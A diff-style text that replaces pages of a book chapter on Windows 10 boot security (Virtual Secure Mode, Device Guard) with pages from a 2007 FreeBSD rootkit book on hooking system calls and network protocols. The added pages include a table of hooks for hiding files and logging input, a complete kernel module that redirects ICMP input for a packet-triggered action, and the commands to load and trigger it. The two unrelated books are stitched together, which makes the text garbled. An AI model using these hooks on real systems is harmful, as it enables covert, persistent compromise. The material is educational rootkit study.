+         as getdirentries, lseek, close, fchdir, and so on. This means that you
+         can affect the operation and/or output of ls(1) by hooking one or more of
+         these calls.
+             The main point to all of this is that when you want to alter a specific
+         process and you don’t know which system call(s) to hook, you just need to
+         perform a kernel trace.
 
 
-Virtualization-Based Security in Windows 10
-        Up until Windows 10, code integrity mechanisms were part of the system
-        kernel itself. That essentially means that the integrity mechanism runs with
-        the same privilege level that it is trying to protect. While this can be effec-
-        tive in many cases, it also means it is possible for an attacker to attack the
-        integrity mechanism itself. To increase the effectiveness of the code integrity
-
-
-                                                                                  Boot Process Security   79
-                 mechanism, Windows 10 introduced two new features: Virtual Secure Mode
-                 and Device Guard, both of which are based on memory isolation assisted
-                 by hardware. This technology is generally referred to as Second Level Address
-                 Translation, and it is included in both Intel (where it is known as Extended
-                 Page Tables, or EPT) and AMD (where it’s called Rapid Virtualization
-                 Indexing, or RVI) CPUs.
-
-                 Second Level Address Translation
-                 Windows has supported Second Level Address Translation (SLAT) since
-                 Windows 8 with Hyper-V (a Microsoft hypervisor). Hyper-V uses SLAT
-                 to perform memory management (for example, access protection) for
-                 virtual machines and to reduce the overhead of translating guest physical
-                 addresses (memory isolated by virtualization technologies) to real physical
-                 addresses.
-                      SLAT provides hypervisors with an intermediary cache of virtual-to-
-                 physical address translation, which drastically reduces the amount of time
-                 the hypervisor takes to service translation requests to the physical memory
-                 of the host. It’s also used in the implementation of Virtual Secure Mode
-                 technology in Windows 10.
-
-                 Virtual Secure Mode and Device Guard
-                 Virtual Secure Mode (VSM) virtualization-based security first appeared in
-                 Windows 10 and is based on Microsoft’s Hyper-V. When VSM is in place,
-                 the operating system and critical system modules are executed in isolated
-                 hypervisor-protected containers. This means that even if the kernel is com-
-                 promised, critical components executed in other virtual environments are
-                 still secure because an attacker cannot pivot from one compromised virtual
-                 container to another. VSM also isolates the code integrity components from
-                 the Windows kernel itself in a hypervisor-protected container.
-                       VSM isolation makes it impossible to use vulnerable legitimate kernel-
-                 mode drivers to disable code integrity (unless a vulnerability is found that
-                 affects the protection mechanism itself). Because the potentially vulnerable
-                 driver and the code integrity libraries are located in separate virtual con-
-                 tainers, attackers should not be able to turn code integrity protection off.
-                       Device Guard technology leverages VSM to prevent untrusted code
-                 from running on the system. To make these assurances, Device Guard
-                 combines VSM-protected code integrity with platform and UEFI Secure
-                 Boot. In doing so, Device Guard enforces the code integrity policy from
-                 the very beginning of the boot process all the way up to loading OS kernel-
-                 mode drivers and user-mode applications.
-                       Figure 6-3 shows how Device Guard affects Windows 10’s ability to pro-
-                 tect against bootkits and rootkits. Secure Boot protects from bootkits by
-                 verifying any firmware components executed in the preboot environment,
+2.4   Common System Call Hooks
+         For the sake of being thorough, Table 2-1 outlines some of the most
+         common system call hooks.
 
 
 
+                                                                                       H ookin g   29
+                   No Starch Press, Copyright © 2007 by Joseph Kong
+                    Table 2-1: Common System Call Hooks
 
-80   Chapter 6
-                  including the OS bootloader. To prevent malicious code from being injected
-                  into the kernel-mode address space, the VSM isolates the critical OS com-
-                  ponents responsible for enforcing code integrity (known as Hypervisor-
-                  Enforced Code Integrity, or HVCI, in this context) from the OS kernel
-                  address space.
-
-                                                         Virtual Secure Mode (VSM)
-
-                                                   Secure
-                                                                       HVCI
-                                                   kernel
-
-
-                                                                  Device Guard
-
-                                                              Hypervisor-Enforced
-              Secure Boot                                   Code Integrity Protection
-
-                              bootmgr                                              Kernel-mode
-  BIOS         UEFI                              OS kernel           ELAM
-                             winload.exe                                             drivers
-
+                    System Call                           Purpose of Hook
+                    read, readv, pread, preadv            Logging input
+                    write, writev, pwrite, pwritev        Logging output
+                    open                                  Hiding file contents
+                    unlink                                Preventing file removal
+                    chdir                                 Preventing directory traversal
+                    chmod                                 Preventing file mode modification
+                    chown                                 Preventing ownership change
+                    kill                                  Preventing signal sending
+                    ioctl                                 Manipulating ioctl requests
+                    execve                                Redirecting file execution
+                    rename                                Preventing file renaming
+                    rmdir                                 Preventing directory removal
+                    stat, lstat                           Hiding file status
+                    getdirentries                         Hiding files
+                    truncate                              Preventing file truncating or extending
+                    kldload                               Preventing module loading
+                    kldunload                             Preventing module unloading
 
 
+                        Now let’s look at some of the other kernel functions that you
+                    can hook.
 
-             Bootkit is      Bootkit patches    Bootkit injects
-             loaded.        system modules.     its code into
-                                                 kernel-mode
-                                               address space.
+     2.5        Communication Protocols
+                    As its name implies, a communication protocol is a set of rules and conventions
+                    used by two communicating processes (for example, the TCP/IP protocol
+                    suite). In FreeBSD, a communication protocol is defined by its entries in a
+                    protocol switch table. As such, by modifying these entries, a rootkit can alter
+                    the data sent and received by either communication endpoint. To better
+                    illustrate this “attack,” allow me to digress.
 
-Figure 6-3: The boot process with Virtual Secure Mode and Device Guard enabled
+                    2.5.1      The protosw Structure
+                    The context of each protocol switch table is maintained in a protosw structure,
+                    which is defined in the <sys/protosw.h> header as follows:
+
+                    struct protosw {
+                            short pr_type;                           /* socket type */
+                            struct domain *pr_domain;                /* domain protocol */
+                            short pr_protocol;                       /* protocol number */
+                            short pr_flags;
+                    /* protocol-protocol hooks */
+                            pr_input_t *pr_input;                    /* input to protocol (from below) */
+                            pr_output_t *pr_output;                  /* output to protocol (from above) */
+
+30   C ha pt er 2
+                                No Starch Press, Copyright © 2007 by Joseph Kong
+        pr_ctlinput_t *pr_ctlinput;                 /* control input (from below) */
+        pr_ctloutput_t *pr_ctloutput;               /* control output (from above) */
+/* user-protocol hook */
+        pr_usrreq_t      *pr_ousrreq;
+/* utility hooks */
+        pr_init_t *pr_init;
+        pr_fasttimo_t *pr_fasttimo;                 /* fast timeout (200ms) */
+        pr_slowtimo_t *pr_slowtimo;                 /* slow timeout (500ms) */
+        pr_drain_t *pr_drain;                       /* flush any excess space possible */
+
+           struct    pr_usrreqs *pr_usrreqs; /* supersedes pr_usrreq() */
+};
+
+   Table 2-2 defines the entry points in struct protosw that you’ll need to
+know in order to modify a communication protocol.
+
+Table 2-2: Protocol Switch Table Entry Points
+
+Entry Point           Description
+pr_init               Initialization routine
+pr_input              Pass data up toward the user
+pr_output             Pass data down toward the network
+pr_ctlinput           Pass control information up
+pr_ctloutput          Pass control information down
 
 
-                  Device Guard Limitations on Driver Development
-                  Device Guard imposes specific requirements and limitations on the driver
-                  development process, and some existing drivers will not run correctly with
-                  it active. All drivers must follow these rules:
+2.5.2      The inetsw[] Switch Table
+Each communication protocol’s protosw structure is defined in the file
+/sys/netinet/in_proto.c. Here is a snippet from this file:
 
-                  •       Allocate all nonpaged memory from the no-execute (NX) nonpaged
-                          pool. The driver’s PE module cannot have sections that are both
-                          writable and executable.
-                  •       Do not attempt direct modification of executable system memory.
-                  •       Do not use dynamic or self-modifying code in kernel mode.
-                  •       Do not load any data as executable.
-
-                      Because most modern rootkits and bootkits do not adhere to these
-                  requirements, they cannot run with Device Guard active, even if the driver
-                  has a valid signature or is able to bypass code integrity protection.
-
-
-
-
-                                                                                         Boot Process Security   81
-     Conclusion
-                 This chapter has provided an overview of the evolution of code integrity
-                 protections. Boot process security is the most important frontier in defend-
-                 ing operating systems against malware attacks. ELAM and code integrity
-                 protections are powerful security features that restrict the execution of
-                 untrusted code on the platform.
-                      Windows 10 took boot process security to a new level, preventing code
-                 integrity bypasses by isolating HVCI components from the OS kernel with
-                 VSM. However, without an active Secure Boot mechanism in place, boot-
-                 kits can circumvent these protections by attacking a system before they are
-                 loaded. In the following chapters, we’ll discuss Secure Boot in more detail
-                 and the BIOS attacks designed to evade it.
+struct protosw inetsw[] = {
+{
+        .pr_type =                         0,
+        .pr_domain =                       &inetdomain,
+        .pr_protocol =                     IPPROTO_IP,
+        .pr_init =                         ip_init,
+        .pr_slowtimo =                     ip_slowtimo,
+        .pr_drain =                        ip_drain,
+        .pr_usrreqs =                      &nousrreqs
+},
+{
+        .pr_type =                         SOCK_DGRAM,
+        .pr_domain =                       &inetdomain,
+        .pr_protocol =                     IPPROTO_UDP,
+        .pr_flags =                        PR_ATOMIC|PR_ADDR,
+        .pr_input =                        udp_input,
+        .pr_ctlinput =                     udp_ctlinput,
+        .pr_ctloutput =                    ip_ctloutput,
+        .pr_init =                         udp_init,
+        .pr_usrreqs =                      &udp_usrreqs
+},
 
 
+                                                                               H ookin g   31
+              No Starch Press, Copyright © 2007 by Joseph Kong
+                    {
+                            .pr_type =                 SOCK_STREAM,
+                            .pr_domain =               &inetdomain,
+                            .pr_protocol =             IPPROTO_TCP,
+                            .pr_flags =                PR_CONNREQUIRED|PR_IMPLOPCL|PR_WANTRCVD,
+                            .pr_input =                tcp_input,
+                            .pr_ctlinput =             tcp_ctlinput,
+                            .pr_ctloutput =            tcp_ctloutput,
+                            .pr_init =                 tcp_init,
+                            .pr_slowtimo =             tcp_slowtimo,
+                            .pr_drain =                tcp_drain,
+                            .pr_usrreqs =              &tcp_usrreqs
+                    },
+                    . . .
+
+                        Notice that every protocol switch table is defined within inetsw[]. This
+                    means that in order to modify a communication protocol, you have to go
+                    through inetsw[].
+
+                    2.5.3    The mbuf Structure
+                    Data (and control information) that is passed between two communicating
+                    processes is stored within an mbuf structure, which is defined in the <sys/mbuf.h>
+                    header. To be able to read and modify this data, there are two fields in
+                    struct mbuf that you’ll need to know: m_len , which identifies the amount
+                    of data contained within the mbuf , and m_data, which points to the data.
+
+     2.6        Hooking a Communication Protocol
+                    Listing 2-3 is an example communication protocol hook designed to output
+                    a debug message whenever an Internet Control Message Protocol (ICMP)
+                    redirect for Type of Service and Host message containing the phrase Shiny
+                    is received.
+
+           NOTE     An ICMP redirect for Type of Service and Host message contains a type field of 5 and a
+                    code field of 3.
+
+                    #include <sys/param.h>
+                    #include <sys/proc.h>
+                    #include <sys/module.h>
+                    #include <sys/kernel.h>
+                    #include <sys/systm.h>
+                    #include <sys/mbuf.h>
+                    #include <sys/protosw.h>
+
+                    #include <netinet/in.h>
+                    #include <netinet/in_systm.h>
+                    #include <netinet/ip.h>
+                    #include <netinet/ip_icmp.h>
+                    #include <netinet/ip_var.h>
 
 
-82   Chapter 6
+
+32   C ha pt er 2
+                              No Starch Press, Copyright © 2007 by Joseph Kong
+#define TRIGGER "Shiny."
+
+extern struct protosw inetsw[];
+pr_input_t icmp_input_hook;
+
+/* icmp_input hook. */
+void
+icmp_input_hook(struct mbuf *m, int off)
+{
+        struct icmp *icp;
+          int hlen = off;
+
+        /* Locate the ICMP message within m. */
+        m->m_len -= hlen;
+          m->m_data += hlen;
+
+        /* Extract the ICMP message. */
+         icp = mtod(m, struct icmp *);
+
+        /* Restore m. */
+         m->m_len += hlen;
+        m->m_data -= hlen;
+
+        /* Is this the ICMP message we are looking for? */
+        if (icp->icmp_type == ICMP_REDIRECT &&
+             icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
+             strncmp(icp->icmp_data, TRIGGER, 6) == 0)
+                  printf("Let's be bad guys.\n");
+        else
+                 icmp_input(m, off);
+}
+
+/* The function called at load/unload. */
+static int
+load(struct module *module, int cmd, void *arg)
+{
+        int error = 0;
+
+        switch (cmd) {
+        case MOD_LOAD:
+                /* Replace icmp_input with icmp_input_hook. */
+                 inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+                break;
+
+        case MOD_UNLOAD:
+                /* Change everything back to normal. */
+                          
+                  inetsw[ ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+                break;
+
+        default:
+                error = EOPNOTSUPP;
+                break;
+        }
+
+        return(error);
+
+                                                                   H ookin g   33
+         No Starch Press, Copyright © 2007 by Joseph Kong
+                    }
+
+                    static moduledata_t icmp_input_hook_mod = {
+                            "icmp_input_hook",      /* module name */
+                            load,                   /* event handler */
+                            NULL                    /* extra data */
+                    };
+
+                    DECLARE_MODULE(icmp_input_hook, icmp_input_hook_mod, SI_SUB_DRIVERS,
+                        SI_ORDER_MIDDLE);
+
+                    Listing 2-3: icmp_input_hook.c
+
+                         In Listing 2-3 the function icmp_input_hook first sets hlen to the received
+                    ICMP message’s IP header length (off). Next, the location of the ICMP
+                    message within m is determined; keep in mind that an ICMP message is
+                    transmitted within an IP datagram, which is why m_data is increased by hlen.
+                                                     
+                    Next, the ICMP message is extracted from m. Thereafter, the changes made
+                             
+                    to m are reversed, so that when m is actually processed, it’s as if nothing
+                    even happened. Finally, if the ICMP message is the one we are looking for,
+                      a debug message is printed; otherwise, icmp_input is called.
+                                                                                 
+                         Notice that upon module load, the event handler registers
+                    icmp_input_hook as the pr_input entry point within the ICMP switch table.
+                    This single line installs the communication protocol hook. To remove
+                                        
+                    the hook, simply reinstate the original pr_input entry point (which is
+                    icmp_input, in this case) upon module unload.
+
+           NOTE                  
+                    The value of ip_protox[IPPROTO_ICMP] is defined as the offset, within inetsw[],
+                    for the ICMP switch table. For more on ip_protox[], see the ip_init function in
+                    /sys/netinet/ip_input.c.
+
+                       The following output shows the results of receiving an ICMP redirect for
+                    Type of Service and Host message after loading icmp_input_hook:
+
+                    $ sudo kldload ./icmp_input_hook.ko
+                    $ echo Shiny. > payload
+                    $ sudo nemesis icmp -i 5 -c 3 -P ./payload -D 127.0.0.1
+
+                    ICMP Packet Injected
+                    $ dmesg | tail -n 1
+                    Let's be bad guys.
+
+                        Admittedly, icmp_input_hook has some flaws; however, for the purpose of
+                    demonstrating a communication protocol hook, it’s more than sufficient.
+                        If you are interested in fixing up icmp_input_hook for use in the real world,
+                    you only need to make two additions. First, make sure that the IP datagram
+                    actually contains an ICMP message before you attempt to locate it. This can
+                    be achieved by checking the length of the data field in the IP header. Second,
+                    make sure that the data within m is actually there and accessible. This can be
+                    achieved by calling m_pullup. For example code on how to do both of these
+                    things, see the icmp_input function in /sys/netinet/ip_icmp.c.
+
+34   C ha pt er 2
+                              No Starch Press, Copyright © 2007 by Joseph Kong
+2.7   Concluding Remarks
+         As you can see, call hooking is really all about redirecting function pointers,
+         and at this point, you should have no trouble doing that.
+              Keep in mind that there are usually a few different entry points you could
+         hook in order to accomplish a specific task. For example, in Section 2.2 I
+         created a keystroke logger by hooking the read system call; however, this can
+         also be accomplished by hooking the l_read entry point in the terminal line
+         discipline (termios)4 switch table.
+              For educational purposes and just for fun, I encourage you to try to
+         hook the l_read entry point in the termios switch table. To do so, you’ll
+         need to be familiar with the linesw[] switch table, which is implemented
+         in the file /sys/kern/tty_conf.c, as well as struct linesw, which is defined in
+         the <sys/linedisc.h> header.
+
+  NOTE   This hook entails a bit more work than the ones shown throughout this chapter.
+
+
+         4
+           The terminal line discipline (termios) is essentially the data structure used to process
+         communication with a terminal and to describe its state.
+
+
+
+
+                                                                                              H ookin g   35
+                    No Starch Press, Copyright © 2007 by Joseph Kong
 
